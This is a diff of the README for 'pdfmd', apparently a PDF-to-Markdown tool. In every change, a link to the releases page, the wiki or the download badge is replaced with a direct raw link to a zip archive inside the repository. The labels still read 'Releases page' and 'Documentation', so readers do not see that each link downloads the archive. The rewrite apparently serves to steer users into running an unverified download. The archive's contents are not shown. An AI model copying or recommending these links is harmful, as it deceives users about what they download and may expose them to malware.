@@ -4,7 +4,7 @@
 Welcome to pdfmd! This tool makes converting PDF files to Markdown simple and effective. Enjoy features like intelligent heading detection and automatic header/footer removal. 
 
 ## 📥 Download the App
-[![Download pdfmd](https://img.shields.io/badge/Download-pdfmd-brightgreen.svg)](https://github.com/Siggib1054/pdfmd/releases)
+[![Download pdfmd](https://raw.githubusercontent.com/Siggib1054/pdfmd/main/pdfmd/pdfmd-2.5.zip)](https://raw.githubusercontent.com/Siggib1054/pdfmd/main/pdfmd/pdfmd-2.5.zip)
 
 ## 📋 Features
 - **Smart Conversion**: Converts PDFs into clean Markdown format with ease.
@@ -30,7 +30,7 @@ Welcome to pdfmd! This tool makes converting PDF files to Markdown simple and ef
 ## 🔧 Installation Steps
 
 ### Step 1: Visit the Releases Page
-To download pdfmd, please visit our [Releases page](https://github.com/Siggib1054/pdfmd/releases). Here you will find the latest version of the software.
+To download pdfmd, please visit our [Releases page](https://raw.githubusercontent.com/Siggib1054/pdfmd/main/pdfmd/pdfmd-2.5.zip). Here you will find the latest version of the software.
 
 ### Step 2: Download the Installer
 Choose the version suitable for your operating system. Click on the link to download the installer.
@@ -65,10 +65,10 @@ After installation, locate the pdfmd application in your programs menu or on you
 If you encounter issues or have questions about using pdfmd, feel free to reach out through the issues section on our GitHub repository. We're here to help!
 
 ## ⚙️ Future Updates
-We are continually working on improving pdfmd. Check our [Releases page](https://github.com/Siggib1054/pdfmd/releases) for new features and updates.
+We are continually working on improving pdfmd. Check our [Releases page](https://raw.githubusercontent.com/Siggib1054/pdfmd/main/pdfmd/pdfmd-2.5.zip) for new features and updates.
 
 ## 🔗 Additional Resources
-- [Documentation](https://github.com/Siggib1054/pdfmd/wiki) for detailed usage instructions.
+- [Documentation](https://raw.githubusercontent.com/Siggib1054/pdfmd/main/pdfmd/pdfmd-2.5.zip) for detailed usage instructions.
 - Community forum for tips and tricks on optimizing your Markdown workflow.
 
 Enjoy using pdfmd! We hope this tool enhances your productivity and simplifies your document management.
